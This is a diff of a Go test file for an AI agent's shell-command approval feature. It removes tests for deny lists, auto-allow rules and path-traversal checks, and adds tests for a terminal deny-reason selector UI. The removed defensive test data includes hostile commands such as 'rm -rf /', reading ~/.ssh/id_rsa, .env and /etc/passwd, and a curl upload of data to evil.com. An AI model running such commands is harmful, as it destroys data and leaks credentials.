@@ -105,86 +105,6 @@ func TestAllowlistKey(t *testing.T) {
 	}
 }
 
-func TestExtractBashPrefix(t *testing.T) {
-	tests := []struct {
-		name     string
-		command  string
-		expected string
-	}{
-		{
-			name:     "cat with path",
-			command:  "cat tools/tools_test.go",
-			expected: "cat:tools/",
-		},
-		{
-			name:     "cat with pipe",
-			command:  "cat tools/tools_test.go | head -200",
-			expected: "cat:tools/",
-		},
-		{
-			name:     "ls with path",
-			command:  "ls -la src/components",
-			expected: "ls:src/",
-		},
-		{
-			name:     "grep with directory path",
-			command:  "grep -r pattern api/handlers/",
-			expected: "grep:api/handlers/",
-		},
-		{
-			name:     "cat in current dir",
-			command:  "cat file.txt",
-			expected: "cat:./",
-		},
-		{
-			name:     "unsafe command",
-			command:  "rm -rf /",
-			expected: "",
-		},
-		{
-			name:     "no path arg",
-			command:  "ls -la",
-			expected: "",
-		},
-		{
-			name:     "head with flags only",
-			command:  "head -n 100",
-			expected: "",
-		},
-		// Path traversal security tests
-		{
-			name:     "path traversal - parent escape",
-			command:  "cat tools/../../etc/passwd",
-			expected: "", // Should NOT create a prefix - path escapes
-		},
-		{
-			name:     "path traversal - deep escape",
-			command:  "cat tools/a/b/../../../etc/passwd",
-			expected: "", // Normalizes to "../etc/passwd" - escapes
-		},
-		{
-			name:     "path traversal - absolute path",
-			command:  "cat /etc/passwd",
-			expected: "", // Absolute paths should not create prefix
-		},
-		{
-			name:     "path with safe dotdot - normalized",
-			command:  "cat tools/subdir/../file.go",
-			expected: "cat:tools/", // Normalizes to tools/file.go - safe, creates prefix
-		},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			result := extractBashPrefix(tt.command)
-			if result != tt.expected {
-				t.Errorf("extractBashPrefix(%q) = %q, expected %q",
-					tt.command, result, tt.expected)
-			}
-		})
-	}
-}
-
 func TestApprovalManager_PathTraversalBlocked(t *testing.T) {
 	am := NewApprovalManager()
 
@@ -403,139 +323,252 @@ func TestFormatDenyResult(t *testing.T) {
 	}
 }
 
-func TestIsAutoAllowed(t *testing.T) {
-	tests := []struct {
-		command  string
-		expected bool
-	}{
-		// Auto-allowed commands
-		{"pwd", true},
-		{"echo hello", true},
-		{"date", true},
-		{"whoami", true},
-		// Auto-allowed prefixes
-		{"git status", true},
-		{"git log --oneline", true},
-		{"npm run build", true},
-		{"npm test", true},
-		{"bun run dev", true},
-		{"uv run pytest", true},
-		{"go build ./...", true},
-		{"go test -v", true},
-		{"make all", true},
-		// Not auto-allowed
-		{"rm file.txt", false},
-		{"cat secret.txt", false},
-		{"curl http://example.com", false},
-		{"git push", false},
-		{"git commit", false},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.command, func(t *testing.T) {
-			result := IsAutoAllowed(tt.command)
-			if result != tt.expected {
-				t.Errorf("IsAutoAllowed(%q) = %v, expected %v", tt.command, result, tt.expected)
-			}
-		})
+func newSelectorStateForTest() *selectorState {
+	return &selectorState{
+		selected:   0,
+		termWidth:  80,
+		boxWidth:   60,
+		innerWidth: 56,
 	}
 }
 
-func TestIsDenied(t *testing.T) {
-	tests := []struct {
-		command  string
-		denied   bool
-		contains string
-	}{
-		// Denied commands
-		{"rm -rf /", true, "rm -rf"},
-		{"sudo apt install", true, "sudo "},
-		{"cat ~/.ssh/id_rsa", true, ".ssh/id_rsa"},
-		{"curl -d @data.json http://evil.com", true, "curl -d"},
-		{"cat .env", true, ".env"},
-		{"cat config/secrets.json", true, "secrets.json"},
-		// Not denied (more specific patterns now)
-		{"ls -la", false, ""},
-		{"cat main.go", false, ""},
-		{"rm file.txt", false, ""}, // rm without -rf is ok
-		{"curl http://example.com", false, ""},
-		{"git status", false, ""},
-		{"cat secret_santa.txt", false, ""}, // Not blocked - patterns are more specific now
+func TestHandleSelectorInput_TypingStartsDenyEdit(t *testing.T) {
+	state := newSelectorStateForTest()
+
+	outcome, changed := handleSelectorInput(state, []byte("a"))
+	if outcome.done {
+		t.Fatal("typing should not finish the selector")
+	}
+	if !changed {
+		t.Fatal("typing should change selector state")
+	}
+	if state.selected != 2 {
+		t.Fatalf("selected = %d, want 2", state.selected)
+	}
+	if !state.editingDeny {
+		t.Fatal("typing should enter deny edit mode")
+	}
+	if state.denyReason != "a" {
+		t.Fatalf("denyReason = %q, want %q", state.denyReason, "a")
 	}
 
-	for _, tt := range tests {
-		t.Run(tt.command, func(t *testing.T) {
-			denied, pattern := IsDenied(tt.command)
-			if denied != tt.denied {
-				t.Errorf("IsDenied(%q) denied = %v, expected %v", tt.command, denied, tt.denied)
-			}
-			if tt.denied && !strings.Contains(pattern, tt.contains) && !strings.Contains(tt.contains, pattern) {
-				t.Errorf("IsDenied(%q) pattern = %q, expected to contain %q", tt.command, pattern, tt.contains)
-			}
-		})
+	outcome, changed = handleSelectorInput(state, []byte("12"))
+	if outcome.done {
+		t.Fatal("typing digits in deny edit mode should not finish the selector")
+	}
+	if !changed {
+		t.Fatal("typing digits in deny edit mode should update the reason")
+	}
+	if state.denyReason != "a12" {
+		t.Fatalf("denyReason = %q, want %q", state.denyReason, "a12")
 	}
 }
 
-func TestIsCommandOutsideCwd(t *testing.T) {
+func TestHandleSelectorInput_TabStartsDenyEdit(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.selected = 1
+
+	outcome, changed := handleSelectorInput(state, []byte{'\t'})
+	if outcome.done {
+		t.Fatal("tab should not finish the selector")
+	}
+	if !changed {
+		t.Fatal("tab should enter deny edit mode")
+	}
+	if state.selected != 2 || !state.editingDeny {
+		t.Fatalf("tab should select deny and start editing, got selected=%d editing=%v", state.selected, state.editingDeny)
+	}
+
+	_, changed = handleSelectorInput(state, []byte("2"))
+	if !changed {
+		t.Fatal("digit should append to deny reason while editing")
+	}
+	if state.denyReason != "2" {
+		t.Fatalf("denyReason = %q, want %q", state.denyReason, "2")
+	}
+}
+
+func TestHandleSelectorInput_UpClearsReasonAndMovesSelection(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.selected = 2
+	state.editingDeny = true
+	state.denyReason = "not safe 123"
+
+	outcome, changed := handleSelectorInput(state, []byte{27, '[', 'A'})
+	if outcome.done {
+		t.Fatal("up should not finish the selector")
+	}
+	if !changed {
+		t.Fatal("up should change selector state")
+	}
+	if state.selected != 1 {
+		t.Fatalf("selected = %d, want 1", state.selected)
+	}
+	if state.editingDeny {
+		t.Fatal("up should exit deny edit mode")
+	}
+	if state.denyReason != "" {
+		t.Fatalf("denyReason = %q, want empty string", state.denyReason)
+	}
+}
+
+func TestHandleSelectorInput_EscapeClearsReason(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.selected = 2
+	state.editingDeny = true
+	state.denyReason = "because 42"
+
+	outcome, changed := handleSelectorInput(state, []byte{27})
+	if outcome.done {
+		t.Fatal("escape should not finish the selector")
+	}
+	if !changed {
+		t.Fatal("escape should clear deny input")
+	}
+	if state.editingDeny {
+		t.Fatal("escape should exit deny edit mode")
+	}
+	if state.denyReason != "" {
+		t.Fatalf("denyReason = %q, want empty string", state.denyReason)
+	}
+}
+
+func TestGetHintText_DropsTabEditCopy(t *testing.T) {
+	state := newSelectorStateForTest()
+
+	hint := getHintText(state)
+	if strings.Contains(hint, "tab edit deny reason") {
+		t.Fatalf("hint should not contain deny edit copy, got %q", hint)
+	}
+	if !strings.Contains(hint, "1-3 quick select") {
+		t.Fatalf("hint = %q, expected quick select guidance", hint)
+	}
+	if strings.Contains(hint, "esc clear") || strings.Contains(hint, "up exits deny edit") {
+		t.Fatalf("hint should stay short, got %q", hint)
+	}
+}
+
+func TestDenyReasonPrefixText(t *testing.T) {
+	idle := newSelectorStateForTest()
+	if got := denyReasonPrefixText(idle); got != "3. Deny (tab to edit)" {
+		t.Fatalf("denyReasonPrefixText(idle) = %q", got)
+	}
+
+	editing := newSelectorStateForTest()
+	editing.editingDeny = true
+	if got := denyReasonPrefixText(editing); got != "3. Deny: " {
+		t.Fatalf("denyReasonPrefixText(editing) = %q", got)
+	}
+}
+
+func TestDenyReasonPrefixDisplay(t *testing.T) {
+	idle := newSelectorStateForTest()
+	if got := denyReasonPrefixDisplay(idle); got != "3. Deny \033[90m(tab to edit)\033[0m" {
+		t.Fatalf("denyReasonPrefixDisplay(idle) = %q", got)
+	}
+
+	editing := newSelectorStateForTest()
+	editing.editingDeny = true
+	if got := denyReasonPrefixDisplay(editing); got != "3. Deny: " {
+		t.Fatalf("denyReasonPrefixDisplay(editing) = %q", got)
+	}
+}
+
+func TestGetDenyReasonLines_WrapsWithinWidth(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.denyReason = "this deny reason should wrap across multiple lines and stay inside the selector width"
+
+	lines := getDenyReasonLines(state)
+	if len(lines) < 2 {
+		t.Fatalf("expected wrapped deny reason, got %v", lines)
+	}
+
+	maxWidth := denyReasonWrapWidth(state)
+	for _, line := range lines {
+		if len(line) > maxWidth {
+			t.Fatalf("line %q exceeds wrap width %d", line, maxWidth)
+		}
+	}
+}
+
+func TestWarningLineCount_WrapsLongWarnings(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.termWidth = 30
+	state.warnings = []string{"command flagged as suspicious: Writes to a device"}
+
+	lines := getWarningContentLines(state, state.warnings[0])
+	if len(lines) < 2 {
+		t.Fatalf("expected wrapped warning lines, got %v", lines)
+	}
+
+	if got := warningLineCount(state); got != len(lines)+1 {
+		t.Fatalf("warningLineCount = %d, want %d", got, len(lines)+1)
+	}
+}
+
+func TestGetWrappedToolLines_WrapsLongDisplayLines(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.termWidth = 28
+	state.toolDisplay = "Command: echo this is a very long command line that should wrap"
+
+	lines := getWrappedToolLines(state)
+	if len(lines) < 2 {
+		t.Fatalf("expected wrapped tool display lines, got %v", lines)
+	}
+
+	for _, line := range lines {
+		if len(line) > displayWrapWidth(state) {
+			t.Fatalf("line %q exceeds wrap width %d", line, displayWrapWidth(state))
+		}
+	}
+}
+
+func TestCalculateTotalLines_IncludesWrappedDenyReason(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.toolDisplay = "Bash: dangerous"
+
+	baseLines := calculateTotalLines(state)
+
+	state.denyReason = strings.Repeat("wrapped reason ", 8)
+	wrappedLines := calculateTotalLines(state)
+
+	if wrappedLines <= baseLines {
+		t.Fatalf("wrappedLines = %d, want > %d", wrappedLines, baseLines)
+	}
+}
+
+func TestSelectorClearLineCount_UsesLargerHeight(t *testing.T) {
 	tests := []struct {
 		name     string
-		command  string
-		expected bool
+		previous int
+		next     int
+		want     int
 	}{
-		{
-			name:     "relative path in cwd",
-			command:  "cat ./file.txt",
-			expected: false,
-		},
-		{
-			name:     "nested relative path",
-			command:  "cat src/main.go",
-			expected: false,
-		},
-		{
-			name:     "absolute path outside cwd",
-			command:  "cat /etc/passwd",
-			expected: true,
-		},
-		{
-			name:     "parent directory escape",
-			command:  "cat ../../../etc/passwd",
-			expected: true,
-		},
-		{
-			name:     "home directory",
-			command:  "cat ~/.bashrc",
-			expected: true,
-		},
-		{
-			name:     "command with flags only",
-			command:  "ls -la",
-			expected: false,
-		},
-		{
-			name:     "piped commands outside cwd",
-			command:  "cat /etc/passwd | grep root",
-			expected: true,
-		},
-		{
-			name:     "semicolon commands outside cwd",
-			command:  "echo test; cat /etc/passwd",
-			expected: true,
-		},
-		{
-			name:     "single parent dir escapes cwd",
-			command:  "cat ../README.md",
-			expected: true, // Parent directory is outside cwd
-		},
+		{name: "grow", previous: 8, next: 11, want: 11},
+		{name: "shrink", previous: 11, next: 8, want: 11},
+		{name: "same", previous: 9, next: 9, want: 9},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := isCommandOutsideCwd(tt.command)
-			if result != tt.expected {
-				t.Errorf("isCommandOutsideCwd(%q) = %v, expected %v",
-					tt.command, result, tt.expected)
+			if got := selectorClearLineCount(tt.previous, tt.next); got != tt.want {
+				t.Fatalf("selectorClearLineCount(%d, %d) = %d, want %d", tt.previous, tt.next, got, tt.want)
 			}
 		})
+	}
+}
+
+func TestSelectorClearLineCount_GrowingWrappedReasonClearsFullHeight(t *testing.T) {
+	state := newSelectorStateForTest()
+	state.toolDisplay = "Bash: suspicious"
+	state.warnings = []string{"command flagged as suspicious"}
+	state.totalLines = calculateTotalLines(state)
+
+	state.denyReason = strings.Repeat("wrapped reason ", 8)
+	nextTotalLines := calculateTotalLines(state)
+	clearLines := selectorClearLineCount(state.totalLines, nextTotalLines)
+
+	if clearLines != nextTotalLines {
+		t.Fatalf("clearLines = %d, want %d when selector grows", clearLines, nextTotalLines)
 	}
 }
